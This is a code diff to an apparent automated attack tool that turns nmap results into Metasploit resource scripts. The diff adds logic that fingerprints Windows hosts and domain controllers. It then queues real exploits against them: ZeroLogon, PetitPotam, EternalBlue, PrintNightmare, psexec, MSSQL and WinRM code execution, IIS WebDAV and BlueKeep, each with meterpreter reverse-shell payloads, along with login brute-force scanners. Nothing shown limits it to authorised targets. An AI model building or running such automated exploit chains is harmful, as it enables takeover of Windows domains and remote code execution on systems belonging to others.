@@ -25,8 +25,9 @@ def parse_nmap(output_dir: Path) -> dict[str, dict]:
         return {}
 
     result: dict[str, dict] = {}
-    host_re = re.compile(r"^Host:\s+(\S+)\s+\(([^)]*)\)")
-    ports_re = re.compile(r"Ports:\s+(.+)")
+    host_re       = re.compile(r"^Host:\s+(\S+)\s+\(([^)]*)\)")
+    ports_re      = re.compile(r"Ports:\s+(.+)")
+    os_re         = re.compile(r"\bOS:\s+([^\t\r\n]+)")
     port_entry_re = re.compile(
         r"(\d+)/(\w+)/(\w+)//([^/]*)//([^/]*)/"
     )
@@ -56,11 +57,21 @@ def parse_nmap(output_dir: Path) -> dict[str, dict]:
                     if prod:
                         products[port_num] = prod
 
+        # OS detection: grepable OS field first, fallback to product banners
+        om = os_re.search(line)
+        os_guess = om.group(1).strip() if om else ""
+        if not os_guess:
+            for prod in products.values():
+                if "windows" in prod.lower() or "microsoft" in prod.lower():
+                    os_guess = prod
+                    break
+
         result[ip] = {
             "hostname": hostname,
             "ports":    sorted(ports),
             "services": services,
             "products": products,
+            "os_guess": os_guess,
         }
 
     return result
@@ -94,6 +105,65 @@ def get_rdp_hosts(nmap_data: dict) -> list[str]:
 
 def get_all_hosts(nmap_data: dict) -> list[str]:
     return list(nmap_data.keys())
+
+
+def get_windows_hosts(nmap_data: dict) -> list[str]:
+    """Return IPs that are likely Windows (OS guess or service banner fingerprint)."""
+    kw = {"windows", "microsoft"}
+    result: list[str] = []
+    for ip, d in nmap_data.items():
+        if any(k in d.get("os_guess", "").lower() for k in kw):
+            result.append(ip)
+            continue
+        matched = False
+        for prod in d.get("products", {}).values():
+            if any(k in prod.lower() for k in kw):
+                result.append(ip)
+                matched = True
+                break
+        if not matched:
+            for svc in d.get("services", {}).values():
+                if "microsoft" in svc.lower() or "ms-wbt" in svc.lower():
+                    result.append(ip)
+                    break
+    return result
+
+
+def get_winrm_hosts(nmap_data: dict) -> list[str]:
+    """Return IPs with WinRM open (port 5985 or 5986)."""
+    return [ip for ip, d in nmap_data.items() if {5985, 5986} & set(d["ports"])]
+
+
+def get_mssql_hosts(nmap_data: dict) -> list[str]:
+    """Return IPs with MSSQL open (port 1433)."""
+    return [ip for ip, d in nmap_data.items() if 1433 in d["ports"]]
+
+
+def get_ldap_hosts(nmap_data: dict) -> list[str]:
+    """Return IPs with LDAP open (port 389/636/3268/3269)."""
+    return [ip for ip, d in nmap_data.items()
+            if {389, 636, 3268, 3269} & set(d["ports"])]
+
+
+def get_kerberos_hosts(nmap_data: dict) -> list[str]:
+    """Return IPs with Kerberos open (port 88)."""
+    return [ip for ip, d in nmap_data.items() if 88 in d["ports"]]
+
+
+def get_dc_hosts(nmap_data: dict) -> list[str]:
+    """Return probable Domain Controllers: Kerberos (88) + LDAP (389/636/3268)."""
+    return [ip for ip, d in nmap_data.items()
+            if 88 in d["ports"] and {389, 636, 3268} & set(d["ports"])]
+
+
+def get_dcerpc_hosts(nmap_data: dict) -> list[str]:
+    """Return IPs with DCE/RPC open (port 135)."""
+    return [ip for ip, d in nmap_data.items() if 135 in d["ports"]]
+
+
+def get_ssh_hosts(nmap_data: dict) -> list[str]:
+    """Return IPs with SSH open (port 22)."""
+    return [ip for ip, d in nmap_data.items() if 22 in d["ports"]]
 
 
 # ─────────────────────────────────────────────────────────────────────────────
@@ -403,13 +473,15 @@ def build_msf_rc(
     lhost: str = "0.0.0.0",
     lport: int = 4444,
     extra_cve_map: dict | None = None,
+    username: str = "",
+    password: str = "",
 ) -> tuple[str, str]:
     """
     Build:
-      1. Main RC script (baseline scanners + CVE-driven exploits)
+      1. Main RC script (baseline + service-specific + OS-aware Windows/AD exploits + CVE-driven)
       2. Post-exploitation RC script (run after session opens)
 
-    Returns: (main_rc_content, post_rc_content)
+    Returns: (main_rc_content, post_rc_path)
     extra_cve_map: additional CVE→MSF entries discovered by --update-cves
     """
     import tempfile, os
@@ -457,39 +529,232 @@ def build_msf_rc(
         lines.append("run -j")
         lines.append("")
 
-    # ── Baseline scanners (always run) ──────────────────────────────
+    # ── Derive host groups from nmap data ─────────────────────────────
+    all_ports:    set[int]  = set()
+    windows_hosts: list[str] = []
+    winrm_hosts:  list[str] = []
+    mssql_hosts:  list[str] = []
+    ldap_hosts:   list[str] = []
+    dc_hosts:     list[str] = []
+    dcerpc_hosts: list[str] = []
+
+    if nmap_data:
+        for d in nmap_data.values():
+            all_ports.update(d.get("ports", []))
+        windows_hosts = get_windows_hosts(nmap_data)
+        winrm_hosts   = get_winrm_hosts(nmap_data)
+        mssql_hosts   = get_mssql_hosts(nmap_data)
+        ldap_hosts    = get_ldap_hosts(nmap_data)
+        dc_hosts      = get_dc_hosts(nmap_data)
+        dcerpc_hosts  = get_dcerpc_hosts(nmap_data)
+
+    def _h(hosts: list[str]) -> str:
+        """Return space-joined IPs, or fall back to the full rhosts string."""
+        return " ".join(hosts) if hosts else rhosts
+
+    # ── Baseline scanners (always run) ────────────────────────────────
     lines.append("# === Baseline Scanners ===")
     add_module("auxiliary/scanner/portscan/tcp",
-               extra={"PORTS": "22,80,443,445,8080,8443,3389,3306,5432,27017"})
+               extra={"PORTS": "21,22,23,25,53,80,88,110,135,139,143,"
+                               "389,443,445,464,593,636,1433,3268,3269,"
+                               "3389,5985,5986,8080,8443,27017"})
     add_module("auxiliary/scanner/smb/smb_ms17_010")
     add_module("auxiliary/scanner/smb/smb_version")
     add_module("auxiliary/scanner/smb/smb_enumshares")
     add_module("auxiliary/scanner/smb/smb_enumusers")
+    add_module("auxiliary/scanner/smb/smb_lookupsid",
+               extra={"MinRID": "500", "MaxRID": "1500"})
 
-    # Service-specific scanners based on nmap data
-    if nmap_data:
-        all_ports: set[int] = set()
-        for d in nmap_data.values():
-            all_ports.update(d.get("ports", []))
+    # ── Service-Specific Scanners (port-driven) ──────────────────────
+    lines.append("# === Service-Specific Scanners ===")
 
-        if 3306 in all_ports:
-            add_module("auxiliary/scanner/mysql/mysql_version")
-        if 5432 in all_ports:
-            add_module("auxiliary/scanner/postgres/postgres_version")
-        if 27017 in all_ports:
-            add_module("auxiliary/scanner/mongodb/mongodb_login")
-        if 6379 in all_ports:
-            add_module("auxiliary/scanner/redis/redis_server")
-        if 3389 in all_ports:
-            add_module("auxiliary/scanner/rdp/rdp_scanner")
-        if 2049 in all_ports:
-            add_module("auxiliary/scanner/nfs/nfsmount")
-        if 21 in all_ports:
-            add_module("auxiliary/scanner/ftp/anonymous")
-        if 161 in all_ports:
-            add_module("auxiliary/scanner/snmp/snmp_enum")
-        if 25 in all_ports:
-            add_module("auxiliary/scanner/smtp/smtp_enum")
+    # Windows RPC / DCOM (port 135) — critical for AD/Windows attack chain
+    if 135 in all_ports:
+        add_module("auxiliary/scanner/dcerpc/endpoint_mapper",
+                   target_hosts=_h(dcerpc_hosts))
+        add_module("auxiliary/scanner/dcerpc/hidden",
+                   target_hosts=_h(dcerpc_hosts))
+        add_module("auxiliary/scanner/dcerpc/management",
+                   target_hosts=_h(dcerpc_hosts))
+        add_module("auxiliary/scanner/dcerpc/tcp_dcerpc_auditor",
+                   target_hosts=_h(dcerpc_hosts))
+
+    # LDAP / Active Directory (port 389, 636, 3268, 3269)
+    if {389, 636, 3268, 3269} & all_ports:
+        add_module("auxiliary/scanner/ldap/ldap_login",
+                   target_hosts=_h(ldap_hosts))
+
+    # Kerberos (port 88) — present on all Domain Controllers
+    if 88 in all_ports:
+        _kerb = get_kerberos_hosts(nmap_data) if nmap_data else []
+        add_module("auxiliary/scanner/kerberos/kerberos_login",
+                   target_hosts=_h(_kerb))
+
+    # WinRM (port 5985/5986) — PowerShell Remoting
+    if {5985, 5986} & all_ports:
+        add_module("auxiliary/scanner/winrm/winrm_auth_methods",
+                   target_hosts=_h(winrm_hosts))
+
+    # MSSQL (port 1433)
+    if 1433 in all_ports:
+        add_module("auxiliary/scanner/mssql/mssql_ping",
+                   target_hosts=_h(mssql_hosts))
+        add_module("auxiliary/scanner/mssql/mssql_login",
+                   target_hosts=_h(mssql_hosts))
+
+    # MySQL (port 3306)
+    if 3306 in all_ports:
+        add_module("auxiliary/scanner/mysql/mysql_version")
+        add_module("auxiliary/scanner/mysql/mysql_login")
+
+    # PostgreSQL (port 5432)
+    if 5432 in all_ports:
+        add_module("auxiliary/scanner/postgres/postgres_version")
+        add_module("auxiliary/scanner/postgres/postgres_login")
+
+    # MongoDB (port 27017)
+    if 27017 in all_ports:
+        add_module("auxiliary/scanner/mongodb/mongodb_login")
+
+    # Redis (port 6379)
+    if 6379 in all_ports:
+        add_module("auxiliary/scanner/redis/redis_server")
+
+    # RDP (port 3389)
+    if 3389 in all_ports:
+        add_module("auxiliary/scanner/rdp/rdp_scanner")
+
+    # NFS (port 2049)
+    if 2049 in all_ports:
+        add_module("auxiliary/scanner/nfs/nfsmount")
+
+    # FTP (port 21)
+    if 21 in all_ports:
+        add_module("auxiliary/scanner/ftp/anonymous")
+        add_module("auxiliary/scanner/ftp/ftp_version")
+
+    # SSH (port 22)
+    if 22 in all_ports:
+        add_module("auxiliary/scanner/ssh/ssh_version")
+
+    # Telnet (port 23)
+    if 23 in all_ports:
+        add_module("auxiliary/scanner/telnet/telnet_version")
+
+    # SNMP (port 161)
+    if 161 in all_ports:
+        add_module("auxiliary/scanner/snmp/snmp_enum")
+        add_module("auxiliary/scanner/snmp/snmp_enumshares")
+
+    # SMTP (port 25)
+    if 25 in all_ports:
+        add_module("auxiliary/scanner/smtp/smtp_enum")
+        add_module("auxiliary/scanner/smtp/smtp_version")
+
+    # HTTP / HTTPS — NTLM auth fingerprint + title grab
+    if {80, 443, 8080, 8443, 8000, 8888} & all_ports:
+        add_module("auxiliary/scanner/http/http_version")
+        add_module("auxiliary/scanner/http/ntlm_info")
+        add_module("auxiliary/scanner/http/title")
+
+    # ── Windows / Active Directory Exploit Probes ─────────────────────
+    # Targeted exploit attempts driven by detected OS + open ports.
+    # Runs even without nuclei CVE findings — covers Windows Server 2019,
+    # Domain Controllers, MSSQL, WinRM, IIS, and RDP attack surfaces.
+    if windows_hosts or dc_hosts:
+        lines.append("# === Windows / Active Directory Exploit Probes ===")
+        _win_done: set[str] = set()
+
+        def add_win(
+            module: str,
+            hosts: list[str],
+            payload: str | None = None,
+            extra: dict | None = None,
+            post: bool = False,
+        ):
+            """Add Windows-specific exploit, skipping duplicates within this section."""
+            if module in _win_done:
+                return
+            _win_done.add(module)
+            add_module(module, target_hosts=_h(hosts),
+                       payload=payload, extra=extra, post_exploit=post)
+
+        # --- Domain Controller attacks (Kerberos + LDAP combo = DC) ---
+        if dc_hosts:
+            lines.append("# -- Domain Controller Attacks --")
+            # ZeroLogon — unauthenticated DC account takeover
+            add_win("auxiliary/admin/dcerpc/cve_2020_1472_zerologon", dc_hosts)
+            # PetitPotam — unauthenticated NTLM relay coerce via LSARPC
+            add_win("auxiliary/admin/dcerpc/cve_2021_36942_petnightmare", dc_hosts)
+            # Certifried — ADCS privilege escalation (CVE-2022-26923)
+            add_win("auxiliary/admin/dcerpc/cve_2022_26923_certifried", dc_hosts)
+            # MS14-068 — Kerberos privilege escalation (older DCs)
+            add_win("auxiliary/admin/kerberos/ms14_068_kerberos_checksum", dc_hosts,
+                    extra={"DOMAIN": "", "USER": username or "Guest"})
+
+        # --- Windows SMB exploits ---
+        win_smb = [ip for ip in (windows_hosts or list((nmap_data or {}).keys()))
+                   if nmap_data and 445 in nmap_data.get(ip, {}).get("ports", [])]
+        if win_smb:
+            lines.append("# -- Windows SMB Exploits --")
+            # EternalBlue (MS17-010) — unpatched Windows SMB RCE
+            add_win("exploit/windows/smb/ms17_010_eternalblue", win_smb,
+                    payload="windows/x64/meterpreter/reverse_tcp", post=True)
+            # EternalRomance / PSExec variant
+            add_win("exploit/windows/smb/ms17_010_psexec", win_smb,
+                    payload="windows/x64/meterpreter/reverse_tcp", post=True)
+            # PrintNightmare — remote print spooler RCE (CVE-2021-1675)
+            add_win("exploit/windows/smb/cve_2021_1675_printspooler", win_smb,
+                    payload="windows/x64/meterpreter/reverse_tcp",
+                    extra={"SMBUSER": username or "", "SMBPASS": password or ""},
+                    post=True)
+            if username and password:
+                # PSExec with valid credentials (service-based RCE)
+                add_win("exploit/windows/smb/psexec", win_smb,
+                        payload="windows/x64/meterpreter/reverse_tcp",
+                        extra={"SMBUser": username, "SMBPass": password},
+                        post=True)
+
+        # --- MSSQL code execution (SA or domain credentials) ---
+        if mssql_hosts:
+            lines.append("# -- MSSQL Exploitation --")
+            add_win("exploit/windows/mssql/mssql_payload", mssql_hosts,
+                    payload="windows/x64/meterpreter/reverse_tcp",
+                    extra={"USERNAME": username or "sa", "PASSWORD": password or ""},
+                    post=True)
+            add_win("auxiliary/admin/mssql/mssql_exec", mssql_hosts,
+                    extra={"USERNAME": username or "sa", "PASSWORD": password or "",
+                           "CMD": "whoami /all"})
+
+        # --- WinRM — PowerShell Remoting RCE (port 5985/5986) ---
+        if winrm_hosts and username and password:
+            lines.append("# -- WinRM Exploitation --")
+            add_win("exploit/windows/winrm/winrm_script_exec", winrm_hosts,
+                    payload="windows/x64/meterpreter/reverse_tcp",
+                    extra={"USERNAME": username, "PASSWORD": password,
+                           "FORCE_VBS": "true"},
+                    post=True)
+
+        # --- IIS / Windows web server attacks ---
+        win_web = [ip for ip in (windows_hosts or [])
+                   if nmap_data and
+                   {80, 443, 8080, 8443} & set(nmap_data.get(ip, {}).get("ports", []))]
+        if win_web:
+            lines.append("# -- IIS / Windows Web Exploits --")
+            # WebDAV buffer overflow (CVE-2017-7269 — IIS 6.0)
+            add_win("exploit/windows/iis/iis_webdav_scstoragepathfromurl", win_web,
+                    payload="windows/meterpreter/reverse_tcp", post=True)
+            # NTLM challenge reveal — extract domain info from IIS NTLM auth
+            add_win("auxiliary/scanner/http/ntlm_info", win_web,
+                    extra={"RPORT": "80"})
+
+        # --- RDP exploitation (BlueKeep — CVE-2019-0708) ---
+        win_rdp = [ip for ip in (windows_hosts or [])
+                   if nmap_data and 3389 in nmap_data.get(ip, {}).get("ports", [])]
+        if win_rdp:
+            lines.append("# -- RDP Exploits (BlueKeep) --")
+            add_win("exploit/windows/rdp/cve_2019_0708_bluekeep_rce", win_rdp,
+                    payload="windows/x64/meterpreter/reverse_tcp", post=True)
 
     # ── CVE-driven exploit modules from nuclei findings ─────────────
     # Merge static map with any auto-discovered entries
@@ -520,15 +785,15 @@ def build_msf_rc(
                 module,
                 target_hosts=host,
                 payload=payload,
-                post_exploit=bool(payload),  # only set AutoRunScript for exploits
+                post_exploit=bool(payload),
             )
 
     lines.append("# === Finish ===")
     lines.append("jobs -l")
-    # sleep 10 is too short — scanners against /24 subnets need 60-120s.
-    # Without this wait, msfconsole exits before background jobs complete
-    # and sessions from exploits never get a chance to connect back.
-    lines.append("sleep 90")
+    # Scanners against /24 subnets need 90-120s to complete.
+    # Without this wait, msfconsole exits before background jobs finish
+    # and reverse-shell sessions never get a chance to connect back.
+    lines.append("sleep 120")
     lines.append("jobs -l")
     lines.append("sessions -l")
     lines.append("exit")
@@ -540,10 +805,17 @@ def collect_all_feed(output_dir: Path) -> dict:
     """Collect all available feed data from all phase outputs."""
     nmap_data = parse_nmap(output_dir)
     return {
-        "nmap":     nmap_data,
-        "hosts":    parse_amass(output_dir) or get_all_hosts(nmap_data),
-        "smb_hosts": get_smb_hosts(nmap_data),
-        "web_hosts": get_web_hosts(nmap_data),
-        "urls":     parse_httpx(output_dir) or get_web_urls(nmap_data),
-        "findings": parse_nuclei(output_dir),
+        "nmap":          nmap_data,
+        "hosts":         parse_amass(output_dir) or get_all_hosts(nmap_data),
+        "smb_hosts":     get_smb_hosts(nmap_data),
+        "web_hosts":     get_web_hosts(nmap_data),
+        "rdp_hosts":     get_rdp_hosts(nmap_data),
+        "ssh_hosts":     get_ssh_hosts(nmap_data),
+        "winrm_hosts":   get_winrm_hosts(nmap_data),
+        "mssql_hosts":   get_mssql_hosts(nmap_data),
+        "ldap_hosts":    get_ldap_hosts(nmap_data),
+        "dc_hosts":      get_dc_hosts(nmap_data),
+        "windows_hosts": get_windows_hosts(nmap_data),
+        "urls":          parse_httpx(output_dir) or get_web_urls(nmap_data),
+        "findings":      parse_nuclei(output_dir),
     }
